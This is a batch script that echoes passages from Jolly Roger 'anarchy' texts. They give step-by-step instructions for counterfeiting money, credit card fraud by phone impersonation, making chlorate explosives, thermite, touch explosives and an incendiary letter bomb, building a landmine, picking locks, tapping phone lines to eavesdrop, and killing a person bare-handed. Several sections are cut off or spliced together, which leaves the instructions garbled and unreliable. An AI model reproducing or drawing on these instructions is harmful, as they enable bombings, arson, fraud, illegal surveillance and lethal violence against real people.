echo 1. Counterfeiting Money by The Jolly Roger
echo.
echo Before reading this article, it would be a very good idea to get a book on photo offset printing, for this is the method used in counterfeiting US currency. If you are familiar with this method of printing, counterfeiting should be a simple task for you.
echo.
echo Genuine currency is made by a process called "gravure", which involves etching a metal block. Since etching a metal block is impossible to do by hand, photo offset printing comes into the process.
echo.
echo Photo offset printing starts by making negatives of the currency with a camera, and putting the negatives on a piece of masking material (usually orange in color). The stripped negatives, commonly called "flats", are then exposed to a lithographic plate with an arc light plate maker.
echo.
echo The burned plates are then developed with the proper developing chemical. One at a time, these plates are wrapped around the plate cylinder of the press.
echo.
echo The press to use should be an 11 by 14 offset, such as the AB Dick 360. Make 2 negatives of the portrait side of the bill, and 1 of the back side. After developing them and letting them dry, take them to a light table. Using opaque on one of the portrait sides, touch out all the green, which is the seal and the serial numbers. The back side does not require any retouching because it is all one color.
echo.
echo Now, make sure all of the negatives are registered (lined up correctly) on the flats. By the way, every time you need another serial number, shoot 1 negative of the portrait side, cut out the serial number, and remove the old serial number from the flat replacing it with the new one.
echo.
echo Now you have all 3 flats, and each represents a different color: black, and 2 shades of green (the two shades of green are created by mixing inks). Now you are ready to burn the plates. Take a lithographic plate and etch three marks on it. These marks must be 2 and 9/16 inches apart, starting on one of the short edges. Do the same thing to 2 more plates. Then, take 1 of the flats and place it on the plate, exactly lining the short edge up with the edge of the plate. Burn it, move it up to the next mark, and cover up the exposed area you have already burned. Burn that, and do the same thing 2 more times, moving the flat up one more mark. Do the same process with the other 2 flats (each on a separate plate).
echo.
echo Develop all three plates. You should now have 4 images on each plate with an equal space between each bill.
echo.
echo The paper you will need will not match exactly, but it will do for most situations. The paper to use should have a 25% rag content. By the way, Disaperf computer paper (invisible perforation) does the job well. Take the paper and load it into the press. Be sure to set the air, buckle, and paper thickness right. Start with the black plate (the plate without the serial numbers). Wrap it around the cylinder and load black ink in. Make sure you run more than you need because there will be a lot of rejects. Then, while that is printing, mix the inks for the serial numbers and the back side. You will need to add some white and maybe yellow to the serial number ink. You also need to add black to the back side. Experiment until you get it right.
echo.
echo Now, clean the press and print the other side. You will now have a bill with no green seal or serial numbers. Print a few with one serial number, make another and repeat. Keep doing this until you have as many different numbers as you want. Then cut the bills to the exact size with a paper cutter. You should have printed a large amount of money by now, but there is still one problem; the paper is pure white. To dye it, mix the following in a pan: 2 cups of hot water, 4 tea bags, and about 16 to 20 drops of green food coloring (experiment with this). Dip one of the bills in and compare it to a genuine US bill. Make the necessary adjustments, and dye all the bills. Also, it is a good idea to make them look used. For example, wrinkle them, rub coffee grinds on them, etc.
echo.
echo As before mentioned, unless you are familiar with photo offset printing, most of the information in this article will be fairly hard to understand. Along with getting a book on photo offset printing, try to see the movie "To Live and Die in LA". It is about a counterfeiter, and the producer does a pretty good job of showing how to counterfeit. A good book on the subject is "The Poor Man's James Bond".
echo.
echo If all of this seems too complicated to you, there is one other method available for counterfeiting: The Canon color laser copier. The Canon can replicate ANYTHING in vibrant color, including US currency. But, once again, the main problem in counterfeiting is the paper used. So, experiment, and good luck!

echo Credit Card Fraud by The Jolly Roger
echo.
echo For most of you out there, money is hard to come by. Until now:
echo With the recent advent of plastic money (credit cards), it is easy to use someone else's credit card to order the items you have always desired
echo in life. The stakes are high, but the payoff is worth it.
echo.
echo Step One: Getting the credit card information
echo First off, you must obtain the crucial item: someone's credit card number. The best way to get credit card numbers is to take the blue carbons
echo used in a credit card transaction at your local department store. These can usually be found in the garbage can next to the register, or for the
echo more daring, in the garbage dumpster behind the store. But, due to the large amount of credit card fraud, many stores have opted to use a
echo carbonless transaction sheet, making things much more difficult. This is where your phone comes in handy.
echo.
echo First, look up someone in the phone book, and obtain as much information as possible about them. Then, during business hours, call in a very
echo convincing voice - "Hello, this is John Doe from the Visa Credit Card Fraud Investigations Department. We have been informed that your credit
echo card may have been used for fraudulent purposes, so will you please read off the numbers appearing on your Visa card for verification." Of
echo course, use your imagination! Believe it or not, many people will fall for this ploy and give out their credit information.
echo.
echo Now, assuming that you have your victim's credit card number, you should be able to decipher the information given.
echo.
echo Step Two: Recognizing information from carbon copies
echo Card example:
echo [American Express]
echo XXXX XXXXXX XXXXX
echo MM/Y1 THRU MM/Y2
echo JOE SHMOE
echo Explanation:
echo MM/Y1 is the date the card was issued, and MM/Y2 is the expiration date. The American Express Gold Card has numbers XXXXXX XXXXXXXX
echo XXXXXXX, and is covered for up to $5000.00, even if the card holder is broke.
echo [Mastercard]
echo 5XXX XXXX XXXX XXXX
echo XXXX AAA DD-MM-YY MM/YY
echo JOE SHMOE
echo Explanation:
echo XXXX in the second row may be asked for during the ordering process. The first date is when the card was new, and the second is when the
echo card expires. The most frequent number combination used is 5424 1800 XXXX XXXX. There are many of these cards in circulation, but many of
echo these are on wanted lists, so check these first.
echo [Visa]
echo 4XXX XXX(X) XXX(X) XXX(X)
echo MM/YY MM/YY*VISA
echo JOE SHMOE
echo Explanation:
echo Visa is the most abundant card, and is accepted almost everywhere. The "*VISA" is sometimes replaced with "BWG", or followed with a
echo special code. These codes are as follows:
echo [1] MM/YY*VISA V - Preferred Card
echo [2] MM/YY*VISA CV - Classic Card
echo [3] MM/YY*VISA PV - Premier Card
echo Preferred Cards are backed with money, and are much safer to use. Classic Cards are newer, harder to reproduce cards with decent
echo backing. Premier Cards are Classic Cards with Preferred coverage. Common numbers are 4448 020 XXX XXX, 4254 5123 6000 XXXX, and
echo 4254 5123 8500 XXXX. Any 4712 1250 XXXX XXXX cards are IBM Credit Union cards, and are risky to use, although they are usually covered
echo for large purchases.
echo.
echo Step Three: Testing credit
echo You should now have a Visa, Mastercard, or American Express credit card number, with the victim's address, zip code, and phone number.
echo By the way, if you have problems getting the address, most phone companies offer the Address Tracking Service, which is a special number
echo you call that will give you an address from a
echo phone number, at a nominal charge. Now you need to check the balance of credit on the credit card (to make sure you don't run out of money),
echo and you must also make sure that the card isn't stolen. To do this you must obtain a phone number that businesses use to check out credit
echo cards during purchases. If you go to a department store, watch the cashier when someone makes a credit card purchase. He/she will usually
echo call a phone number, give the credit information, and then give what is called a "Merchant Number". These numbers are usually written down
echo on or around the register. It is easy to either find these numbers and copy them, or to wait until they call one in. Watch what they dial and wait
echo for the 8 digit (usually) merchant number. Once you call the number, in a calm voice, read off the account number, merchant number, amount,
echo and expiration date. The credit bureau will tell you if it is OK, and will give you an authorization number. Pretend you are writing this number
echo down, and repeat it back to them to check it. Ignore this number completely, for it serves no real purpose. However, once you do this, the bank
echo removes dollars equal to what you told them, because the card was supposedly used to make a purchase. Sometimes you can trick the
echo operator by telling her the customer changed his mind and decided not to charge it. Of course, some will not allow this. Remember at all times
echo that you are supposed to be a store clerk calling to check out the card for a purchase. Act like you are talking with a customer when he/she
echo "cancels".
echo.
echo Step Four: The drop
echo Once the cards are cleared, you must find a place to have the package sent. NEVER use a drop more than once. The following are typical drop
echo sites:
echo [1] An empty house
echo An empty house makes an excellent place to send things. Send the package UPS, and leave a note on the door saying, "UPS. I work days, 8 to
echo 6. Could you please leave the package on the back door step?" You can find dozens of houses from a real estate agent by telling them you
echo want to look around for a house. Ask for a list of twenty houses for sale, and tell them you will check out the area. Do so, until you find one
echo that suits your needs.
echo [2] Rent A Spot
echo U-Haul sometimes rents spaces where you can have packages sent and signed for. End your space when the package arrives.
echo [3] People's houses
echo Find someone you do not know, and have the package sent there. Call ahead saying that "I called the store and they sent the package to the
echo wrong address. It was already sent, but can you keep it there for me?" This is a very reliable way if you keep calm when talking to the people.
echo Do NOT try post office boxes. Most of the time, UPS will not deliver to a post office box, and many people have been caught in the past
echo attempting to use a post office box. Also, when you have determined a drop site, keep an eye on it for suspicious characters and cars that
echo have not been there before.
echo.
echo Step Five: Making the transaction
echo You should now have a reliable credit card number with all the necessary billing information, and a good drop site.
echo The best place to order from is catalogues, and mail order houses. It is in your best interest to place the phone call from a pay phone,
echo especially if it is a 1-800 number. Now, when you call, don't try to disguise your voice, thinking you will trick the salesperson into believing you
echo are an adult. These folks are trained to detect this, so your best bet is to order in your own voice. They will ask for the following: name, name
echo as it appears on card, phone number, billing address, expiration date, method of shipping, and product. Ask if they offer UPS Red shipping
echo (next day arrival), because it gives them less time to research an order. If you are using American Express, you might have a bit of a problem
echo shipping to an address other than the billing address. Also, if the salesperson starts to ask questions, do NOT hang up. Simply talk your way
echo out of the situation, so you won't encourage investigation on the order.
echo.
echo If everything goes right, you should have the product, free of charge. Insurance picks up the tab, and no one is any wiser. Be careful, and try
echo not to order anything over $500. In some states, UPS requires a signature for anything over $200, not to mention that anything over $200 is
echo defined as grand theft, as well as credit fraud. Get caught doing this, and you will bite it for a couple of years

echo 3. Making Plastic Explosives from Bleach by The Jolly Roger
echo Potassium chlorate is an extremely volatile explosive compound, and has been used in the past as the main explosive filler in grenades, land mines, and mortar rounds by such countries as France and Germany. Common household bleach contains a small amount of potassium chlorate, which can be extracted by the procedure that follows.
echo First off, you must obtain:
echo 1. A heat source (hot plate, stove, etc.)
echo 2. A hydrometer, or battery hydrometer
echo 3. A large Pyrex, or enameled steel container (to weigh chemicals)
echo 4. Potassium chloride (sold as a salt substitute at health and nutrition stores)
echo Take one gallon of bleach, place it in the container, and begin heating it. While this solution heats, weigh out 63 grams of potassium chloride and add this to the bleach being heated. Constantly check the solution being heated with the hydrometer, and boil until you get a reading of 1.3. If using a battery hydrometer, boil until you read a FULL charge.
echo Take the solution and allow it to cool in a refrigerator until it is between room temperature and 0øC. Filter out the crystals that have formed and save them. Boil this solution again and cool as before. Filter and save the crystals.
echo Take the crystals that have been saved, and mix them with distilled water in the following proportions: 56 grams per 100 milliliters distilled water. Heat this solution until it boils and allow to cool. Filter the solution and save the crystals that form upon cooling. This process of purification is called "fractional crystallization". These crystals should be relatively pure potassium chlorate.
echo Powder these to the consistency of face powder, and heat gently to drive off all moisture.
echo Now, melt five parts Vaseline with five parts wax. Dissolve this in white gasoline (camp stove gasoline), and pour this liquid on 90 parts potassium chlorate (the powdered crystals from above) into a plastic bowl. Knead this liquid into the potassium chlorate until intimately mixed. Allow all gasoline to evaporate.
echo Finally, place this explosive into a cool, dry place. Avoid friction, sulfur, sulfides, and phosphorous compounds. This explosive is best molded to the desired shape and density of 1.3 grams in a cube and dipped in wax until waterproof. These block type charges guarantee the highest detonation velocity. Also, a blasting cap of at least a 3 grade must be used.
echo The presence of the aforementioned compounds (sulfur, sulfides, etc.) results in mixtures that are or can become highly sensitive and will possibly decompose explosively while in storage. You should never store homemade explosives and you must use EXTREME caution at all times while performing the processes in this article.

echo 4. Picking Master Locks by The Jolly Roger
echo.
echo Have you ever tried to impress someone by picking one of those Master combination locks and failed?
echo The Master lock company made their older combination locks with a protection scheme. If you pull the handle too hard, the knob will not turn.
echo That was their biggest mistake.
echo.
echo The first number:
echo Get out any of the Master locks so you know what is going on. While pulling on the clasp (part that springs open when you get the combination
echo right), turn the knob to the left until it will not move any more, and add five to the number you reach. You now have the first number of the
echo combination.
echo.
echo The second number:
echo Spin the dial around a couple of times, then go to the first number you got. Turn the dial to the right, bypassing the first number once. When you
echo have bypassed the first number, start pulling on the clasp and turning the knob. The knob will eventually fall into the groove and lock. While in
echo the groove, pull the clasp and turn the knob. If the knob is loose, go to the next groove, if the knob is stiff, you have the second number of the
echo combination.
echo.
echo The third number:
echo After getting the second number, spin the dial, then enter the two numbers. Slowly spin the dial to the right, and at each number, pull on the
echo clasp. The lock will eventually open if you did the process right.
echo.
echo This method of opening Master locks only works on older models. Someone informed Master of their mistake, and they employed a new
echo mechanism that is foolproof (for now).

echo 5. The Arts of Lockpicking I by The Jolly Roger
echo Lockpicking I: Cars and assorted other locks
echo While the basic themes of lockpicking and uninvited entry have not changed much in the last few years, some modern devices and techniques have appeared on the scene.
echo Automobiles:
echo Many older automobiles can still be opened with a Slim Jim type of opener (these and other auto locksmithing techniques are covered fully in the book "In the Still of the Night", by John Russell III); however, many car manufacturers have built cases over the lock mechanism, or have moved the lock mechanism so the Slim Jim will not work. So:
echo American Locksmith Service
echo P.O. Box 26
echo Culver City, CA 90230
echo ALS offers a new and improved Slim Jim that is 30 inches long and 3/4 inches wide, so it will both reach and slip through the new car lock covers (inside the door). Price is $5.75 plus $2.00 postage and handling.
echo Cars manufactured by General Motors have always been a bane to people who needed to open them, because the sidebar locking unit they employ is very difficult to pick. To further complicate matters, the new GM cars employ metal shields to make the use of a Slim Jim type instrument very difficult. So:
echo Lock Technology Corporation
echo 685 Main St.
echo New Rochelle, NY 10801
echo LTC offers a cute little tool which will easily remove the lock cylinder without harm to the vehicle, and will allow you to enter and/or start the vehicle. The GMC-40 sells for $56.00 plus $2.00 for postage and handling.
echo The best general automobile opening kit is probably a set of lockout tools offered by:
echo Steck MFG Corporation
echo 1319 W. Stewart St.
echo Dayton, OH 45408
echo For $29.95 one can purchase a complete set of six carbon lockout tools that will open more than 95% of all the cars around.
echo Kwickset locks have become quite popular as one step security locks for many types of buildings. They are a bit harder to pick and offer a higher degree of security than a normal builder installed door lock. So:
echo A MFG
echo 1151 Wallace St.
echo Massilon, OH 44646
echo Price is $11.95. Kwickset locks can handily be disassembled and the door opened without harm to either the lock or the door by using the above mentioned Kwick Out tool.
echo If you are too lazy to pick auto locks:
echo Veehof Supply
echo Box 361
echo Storm Lake, IO 50588
echo VS sells tryout keys for most cars (tryout keys are used since there is no one master key for any one make of car, but there are group type masters (a.k.a. tryout keys). Prices average about $20.00 a set.
echo Updated Lockpicking:
echo For years, there have been a number of pick attack procedures for most pin and tumbler lock systems. In reverse order of ease they are as follows:
echo Normal Picking:
echo Using a pick set to align the pins, one by one, until the shear line is set and the lock opens.
echo Racking:
echo This method uses picks that are constructed with a series of bumps, or diamond shape notches. These picks are "raked" (i.e. run over all the pins at one time). With luck, the pins will raise in the open position and stay there. Raking, if successful, can be much less of an effort than standard picking.
echo Lock Aid Gun:
echo This gun shaped device was invented a number of years ago and has found application with many locksmiths and security personnel.
echo Basically, a needle shaped pick is inserted in the snout of the "gun", and the "trigger" is pulled. This action snaps the pick up and down strongly. If the tip is slipped under the pins, they will also be snapped up and down strongly. With a bit of luck they will strike each other and separate at the shear line for a split second. When this happens the lock will open. The lock aid gun is not 100% successful, but when it does work, the results are very dramatic. You can sometimes open the lock with one snap of the trigger.
echo Vibrator:
echo Some crafty people have mounted a needle pick into an electric toothbrush power unit. This vibrating effect will sometimes open pin tumbler locks -- instantly.
echo There is now another method to open pin and wafer locks in a very short time. Although it resembles a toothbrush pick in appearance, it is actually an electronic device. I am speaking of the Cobra pick that is designed and sold by:
echo Fed Corporation
echo P.O. Box 569
echo Scottsdale, AR 85252
echo The Cobra uses two nine volt batteries, teflon bearings (for less noise), and a cam roller. It comes with three picks (for different types of locks) and works both in America and overseas, on pin or wafer locks. The Cobra will open group one locks (common door locks) in three to seven seconds with no damage, in the hands of an experienced locksmith. It can take a few seconds more or up to a half a minute for someone with no experience at all. It will also open group two locks (including government, high security, and medicos), although this can take a short time longer. It will not open GM sidebar locks, although a device is about to be introduced to fill that gap. How much for this toy that will open most locks in seven seconds?
echo $235.00 plus $4.00 shipping and handling.
echo For you hard core safe crackers, FC also sells the MI-6 that will open most safes at a cost of $10,000 for the three wheel attack model, and $10,500 for the four wheel model. It comes in a sturdy aluminum carrying case with monitor, disk drive and software.
echo If none of these safe and sane ideas appeal to you, you can always fall back on the magic thermal lance...
echo The thermal lance is a rather crude instrument constructed from 3/8 inch hollow magnesium rods. Each tube comes in a 10 foot length, but can be cut down if desired. Each one is threaded on one end. To use the lance, you screw the tube together with a matted regulator (like a welding outfit uses) and hook up an oxygen tank. Then oxygen is turned on and the rod is lit with a standard welding igniter. The device produces an incredible amount of heat. It is used for cutting up concrete blocks or even rocks. An active lance will go through a foot of steel in a few seconds. The lance is also known as a burning bar, and is available from:

echo 6. The Arts of Lockpicking II by The Jolly Roger
echo.
echo So you want to be a criminal. Well, if you want to be like James Bond and open a lock in fifteen seconds, then go to Hollywood, because that is the only place you are ever going to do it. Even experienced locksmiths can spend five to ten minutes on a lock if they are unlucky. If you are wanting extremely quick access, look elsewhere. The following instructions will pertain mostly to the "lock in knob" type lock, since it is the easiest to pick.
echo.
echo First of all, you need a pick set. If you know a locksmith, get him to make you a set. This will be the best possible set for you to use. If you find a locksmith unwilling to supply a set, don't give up hope. It is possible to make your own, if you have access to a grinder (you can use a file, but it takes forever).
echo.
echo The thing you need is an allen wrench set (very small). These should be small enough to fit into the keyhole slot. Now, bend the long end of the allen wrench at a slight angle (not 90°). Now, take your pick to a grinder or a file, and smooth the end until it is rounded so it won't hang inside the lock. Test your tool out on doorknobs at your house to see if it will slide in and out smoothly. Now, this is where the screwdriver comes in.
echo.
echo It must be small enough for it and your pick to be used in the same lock at the same time, one above the other. In the coming instructions, please refer to this chart of the interior of a lock:
echo.
echo " ______________________________     "
echo " \ K                                "
echo " | | | | | | / E                    "
echo " | | | | \ Y [|] Upper tumbler pin  "
echo " ^ ^ / H [^] Lower tumbler pin      "
echo " ^ ^ ^ ^ ^ ^ \ O [-] Cylinder wall  "
echo " / L (This is a greatly simplified  "
echo " \ E drawing)                       "
echo " ______________________________/    "
echo.
echo The object is to press the pin up so that the space between the upper pin and the lower pin is level with the cylinder wall. Now, if you push a pin up, it's tendency is to fall back down, right? That is where the screwdriver comes in. Insert the screwdriver into the slot and turn. This tension will keep the "solved" pins from falling back down. Now, work from the back of the lock to the front, and when you are through, there will be a click, the screwdriver will turn freely, and the door will open.
echo.
echo Do not get discouraged on your first try! It will probably take you about twenty to thirty minutes your first time. After that, you will quickly improve with practice.

title Solidox Bombs by The Jolly Roger
echo Most people are not aware that a volatile, extremely explosive chemical can be bought over the counter: Solidox.
echo Solidox comes in an aluminum can containing 6 grey sticks, and can be bought at K-Mart, and various hardware supply shops for around $7.00.
echo Solidox is used in welding applications as an oxidizing agent for the hot flame needed to melt metal. The most active ingredient in Solidox
echo is potassium chlorate, a filler used in many military applications in the WWII era.
echo Since Solidox is literally what the name says: SOLID OXygen, you must have an energy source for an explosion. The most common and readily
echo available energy source is common household sugar, or sucrose. In theory, glucose would be the purest energy source, but it is hard to find a
echo solid supply of glucose.
echo Making the mixture:
echo 1.Open the can of Solidox, and remove all 6 sticks. One by one, grind up each of the sticks (preferably with a mortar and pestle) into the finest
echo powder possible.
echo 2.The ratio for mixing the sugar with the Solidox is 1:1, so weigh the Solidox powder, and grind up the equivalent amount of sugar.
echo 3.Mix equivalent amounts of Solidox powder, and sugar in a 1:1 ratio.
echo It is just that simple! You now have an extremely powerful substance that can be used in a variety of applications. A word of caution: be
echo EXTREMELY careful in the entire process. Avoid friction, heat, and flame. A few years back, a teenager I knew blew 4 fingers off while trying
echo to make a pipe bomb with Solidox. You have been warned!

echo 8. High Tech Revenge: The Beigebox - Rev.2 by The Jolly Roger
echo.
echo I. Introduction
echo Have you ever wanted a lineman's handset? Surely every phreak has at least once considered the phun that he could have with one. After searching unlocked phone company trucks for months, we had an idea. We could build one. We did, and named it the "Beige Box" simply because that is the color of ours.
echo The beigebox is simply a consumer lineman's handset, which is a phone that can be attached to the outside of a person's house. To fabricate a beigebox, follow along.
echo.
echo II. Construction and Use
echo The construction is very simple. First you must understand the concept of the device. In a modular jack, there are four wires. These are red, green, yellow, and black. For a single line telephone, however, only two matter: the red (ring) and green (tip). The yellow and the black are not necessary for this project. A lineman's handset has two clips on it: the ring and the tip. Take a modular jack and look at the bottom of it's casing.
echo There should be a grey jack with four wires (red, green, yellow and black) leading out of it. To the end of the red wire attach a red alligator clip. To the end of the green wire attach a green alligator clip. The yellow and black wires can be removed, although I would only set them aside so that you can use the modular jack in future projects. Now insert your telephone's modular plug into the modular jack. That's it. This particular model is nice because it is can be easily made, is inexpensive, uses common parts that are readily available, is small, is lightweight, and does not require the destruction of a phone.
echo.
echo III. Beige Box Uses
echo There are many uses for a Beige Box. However, before you can use it, you must know how to attach it to the output device. This device can be of any of Bell switching apparatus that include germinal sets (i.e. remote switching centers, bridgin heads, cans, etc.) To open most Bell Telephone switching apparatus, you must have a 7/16 inch hex driver (or a good pair of needle nose pliers work also). This piece of equipment can be picked up at your local hardware store. With your hex driver (or pliers), turn the security bolt(s) approximately 1/8 of an inch counter-clockwise and open. If your output device is locked, then you must have some knowledge of destroying and/or picking locks. However, we have never encountered a locked output device. Once you have opened your output device, you should see a mass of wires connected to terminals. On most output devices, the terminals should be labeled "T" (Tip -- if not labeled, it is usually on the left) and "R" (Ring -- if not labeled, usually on the right).
echo Remember: Ring - red - right. The "Three R's" -- a simple way to remember which is which. Now you must attach all the red alligator clip (Ring) to the "R" (Ring) terminal. Attach the green alligator clip (Tip) to the "T" (Tip) terminal.
echo Note: If instead of a dial tone you hear nothing, adjust the alligator clips so that they are not touching each other terminals. Also make sure they are firmly attached. By this time you should hear a dial tone. Dial ANI to find out the number you are using (you wouldn't want to use your own). Here are some practical applications:
echo • Eavesdropping
echo • Long distance, static free, free fone calls to phriends
echo • Dialing direct to Alliance Teleconferencing (also no static)
echo • Phucking people over
echo • Bothering the operator at little risk to yourself
echo • Blue Boxing with greatly reduced chance of getting caught
echo • Anything at all you want, since you are on an extension of that line
echo.
echo Eavesdropping
echo To be most effective, first attach the Beige Box then your phone. This eliminates the static caused by connecting the box, therefore reducing the potential suspicion of your victim. When eavesdropping, it is always best to be neither seen nor heard. If you hear someone dialing out, do not panic; but rather hang up, wait, and pick up the receiver again. The person will either have hung up or tried to complete their call again. If the latter is true, then listen in, and perhaps you will find information worthy of blackmail! If you would like to know who you are listening to, after dialing ANI, pull a CN/A on the number.
echo.
echo Dialing Long Distance
echo This section is self explanatory, but don't forget to dial a "1" before the NPA.
echo.
echo Dialing Direct to Alliance Teleconferencing
echo Simply dial 0-700-456-1000 and you will get instructions from there. I prefer this method over PBX's, since PBX's often have poor reception and are more difficult to come by.
echo.
echo Phucking People Over
echo This is a very large topic of discussion. Just by using the other topics described, you can create a large phone bill for the person (they will not have to pay for it, but it will be a big hassle for them). In addition, since you are an extension of the person's line, you can leave your phone off the hook, and they will not be able to make or receive calls. This can be extremely nasty because no one would expect the cause of the problem.
echo.
echo Bothering the Operator
echo This is also self explanatory and can provide hours of entertainment. Simply ask her things that are offensive or you would not like traced to your line. This also corresponds to the previously described section, Phucking People Over. After all, guess who's line it gets traced to?
echo.
echo Blue Boxing
echo See a file on Blue Boxing for more details. This is an especially nice feature if you live in an ESS-equipped prefix, since the calls are, once again, not traced to your line...
echo.
echo IV. POTENTIAL RISKS OF BEIGE BOXING
echo Overuse of the Beige Box may cause suspicions within the Gestapo, and result in legal problems. Therefor, I would recommend you:
echo • Choose a secluded spot to do your Beige Boxing,
echo • Use more than one output device
echo • Keep a low profile (i.e., do not post under your real name on a public BBS concerning your accomplishments)
echo.
echo In order to make sure the enemy has not been inside your output device, I recommend you place a piece of transparent tape over the opening of your output device. Therefor, if it is opened in your absence, the tape will be displaced and you will be aware of the fact that someone has intruded on your territory.
echo.
echo Now, imagine the possibilities: a $2000 dollar phone bill for that special person, 976 numbers galore, even harassing the operator at no risk to you! Think of it as walking into an enemies house, and using their phone to your heart's content

echo 10. Thermite II by Jolly Roger
echo Thermite is nasty shit. Here is a good and easy way to make it. The first step is to get some iron-oxide (which is RUST!). Here is a good way to make large quantities in a short time:
echo • Get a DC converter like the one used on a train set. Cut the connector off, separate the wires, and strip them both.
echo • Now you need a jar of water with a tablespoon or so of sodium chloride (which is SALT!) added to it. This makes the water conductive.
echo • Now insert both wires into the mixture (I am assuming you plugged the converter in...) and let them sit for five minutes. One of them will start bubbling more than the other. This is the POSITIVE(+) wire. If you do not do this test right, the final product will be the opposite (chemically) of rust, which is RUST ACID. You have no use for this here (although it IS useful!).
echo • Anyway, put the nail tied to the positive wire into the jar. Now put the negative wire in the other end. Now let it sit overnight and in the morning scrape the rust off of the nail and repeat until you got a bunch of rust on the bottom of the glass. Be generous with your rust collection. If you are going through the trouble of making thermite, you might as well make a lot, right?
echo • Now remove the excess water and pour the crusty solution onto a cookie sheet. Dry it in the sun for a few hours, or inside overnight. It should be an orange-brown color (although I have seen it in many different colors! Sometimes the color gets fucked up, what can I say... but it is still iron oxide!)
echo • Crush the rust into a fine powder and heat it in a cast-iron pot until it is red. Now mix the pure iron oxide with pure aluminum filings which can be bought or filed down by hand from an aluminum tube or bar. The ratio or iron oxide to aluminum is 8 grams to 3 grams.
echo • Congrats! You have just made THERMITE! Now, to light it...
echo • Thermite requires a LOT of heat (more than a blow torch!) to ignite. However, magnesium ribbon (which is sort of hard to find.. call around) will do the trick. It takes the heat from the burning magnesium to light the thermite.
echo • Now when you see your victim's car, pour a fifty-cent sized pile onto his hood, stick the ribbon in it, and light the ribbon with the blow torch. Now chuckle as you watch it burn through the hood, the block, the axle, and the pavement. BE CAREFUL! The ideal mixtures can vaporize CARBON STEEL! Another idea is to use thermite to get into pay phone cash boxes.

echo 11. Touch Explosives by the Jolly Roger
echo This is sort of a mild explosive, but it can be quite dangerous in large quantities. To make touch explosive (such as that found in a snap-n-pop,
echo but more powerful), use this recipe:
echo • Mix iodine crystals into ammonia until the iodine crystals will not dissolve into the ammonia anymore. Pour off the excess ammonia and dry
echo out the crystals on a baking sheet the same way as you dried the thermite (in other words, just let it sit overnight!).
echo • Be careful now because these crystals are now your touch explosive. Carefully wrap a bunch in paper (I mean carefully! Friction sets
echo 'em off!) and throw them around.. pretty loud, huh? They are fun to put on someone's chair. Add a small fish sinker to them and they can
echo be thrown a long distance (good for crowds, football games, concerts, etc.)

echo 1 part aluminum powder
echo 2 parts iron (rust) powder
echo Mix well and set aside.
echo.
echo Next, mix the iron with aluminum fillings in a ratio of 75% aluminum to 25% iron:
echo 3 parts aluminum powder
echo 1 part iron powder (from the mild thermite recipe)
echo Mix well and set aside.

echo Go to the post office and buy an insulated (padded) envelope. Separate the layers and place the mild thermite in the main section:
echo Open the envelope and separate the layers.
echo Place the mild thermite in the main section where the letter would go.
echo Close the envelope and set aside.
echo.
echo Place magnesium powder in the outer layer:
echo Open the outer layer of the envelope.
echo Sprinkle magnesium powder evenly over the outer layer.
echo Close the envelope and set aside.
echo.
echo To light the bomb, you need to create a fuse using touch explosive:
echo Follow The Jolly Roger's instructions for creating touch explosive in another one of their anarchy files.
echo Wrap it like a long cigarette and place it at the top of the envelope in the outer layer (on top of the powdered magnesium).
echo When torn or squeezed hard, it will ignite the powdered magnesium (like a flashlight) and then burn the mild thermite. If the thermite doesn't blow up, echo it will at least burn your enemy's flesh!

echo 25. Unlisted Phone Numbers by The Jolly Roger
echo There are a couple of different ways of doing this. Let's see if this one will help: Every city has one or more offices dedicated to assigning numbers to the telephone wire pairs. These offices are called DPAC offices and are available to service reps who are installing or repairing phones. To get the DPAC number, a service rep would call the customer service number for billing information in the town that the number is located in that he is trying to get the unlisted number of. (Got that?) The conversation would go something like this: "Hi, Amarillo, this is Joe from Anytown business office, I need the DPAC number for the south side of town." This info is usually passed out with no problems, so... if the first person you call doesn't have it, try another. REMEMBER, no one has ANY IDEA who the hell you are when you are talking on the phone, so you can be anyone you damn well please! When you call the DPAC number, just tell them that you need a listing for either the address that you have, or the name. DPAC DOES NOT SHOW WHETHER THE NUMBER IS LISTED OR UNLISTED!! Also, if you're going to make a habit of chasing numbers down, you might want to check into getting a criss-cross directory, which lists phone numbers by their addresses. It costs a couple hundred bucks, but it is well worth it if you have to chase more than one or two numbers down!

echo 33. How to make a landmine by The Jolly Roger 
echo First, you need to get a push-button switch. Take the wires of it and connect one to a nine volt battery connector and the other to a solar 
echo igniter (used for launching model rockets). A very thin piece of stereo wire will usually do the trick if you are desperate, but I recommend the 
echo igniter. Connect the other wire of the nine-volt battery to one end of the switch. Connect a wire from the switch to the other lead on the solar 
echo igniter.

echo dig a hole; not too deep but enough to cover all of the materials. Think about what direction your enemy will be coming from and plant the 
echo switch, but leave the button visible (not TOO visible!). Plant the explosive about 3-5 feet away from the switch because there will be a delay in 
echo the explosion that depends on how short your wick is, and, if a homemade wick is being used, its burning speed. But if you get it right… and

echo 40. How to Kill Someone with your Bare Hands by The Jolly Roger
echo This file will explain the basics of hand-to-hand combat, and will tell of the best places to strike and kill an enemy. When engaged in hand-to-
echo hand combat, your life is always at stake. There is only one purpose in combat, and that is to kill your enemy. Never face an enemy with the
echo idea of knocking him out. The chances are extremely good that he will kill YOU instead. When a weapon is not available, one must resort to the
echo full use of his natural weapons. The natural weapons are:
echo 1.The knife edge of your hands.
echo 2.Fingers folded at the second joint or knuckle.
echo 3.The protruding knuckle of your second finger.
echo 4.The heel of your hand.
echo 5.Your boot
echo 6.Elbows
echo 7.Knees
echo 8.Your Teeth.
echo Attacking is a primary factor. A fight was never won by defensive action. Attack with all of your strength. At any point or any situation, some
echo vulnerable point on your enemies body will be open for attack. Do this while screaming as screaming has two purposes.
echo 1.To frighten and confuse your enemy.
echo 2.To allow you to take a deep breath which, in turn, will put more oxygen in your blood stream.
echo Your balance and balance of your enemy are two important factors; since, if you succeed in making your enemy lose his balance, the chances
echo are nine to one that you can kill him in your next move. The best over-all stance is where your feet are spread about shoulders width apart,
echo with your right foot about a foot ahead of the left. Both arms should be bent at the elbows parallel to each other. Stand on the balls of your feet
echo and bend your waist slightly. Kind of like a boxer's crouch. Employing a sudden movement or a scream or yell can throw your enemy off-
echo balance. There are many vulnerable points of the body. We will cover them now:
echo Eyes: Use your fingers in a V-shape and attack in gouging motion.
echo Nose:(Extremely vulnerable) Strike with the knife edge of the hand along the bridge, which will cause breakage, sharp pain, temporary
echo blindness, and if the blow is hard enough, death. Also, deliver a blow with the heel of your hand in an upward motion, this will shove the bone
echo up into the brain causing death.
echo Adam's Apple: This spot is usually pretty well protected, but if you get the chance, strike hard with the knife edge of your hand. This should
echo sever the wind-pipe, and then it's all over in a matter of minutes.
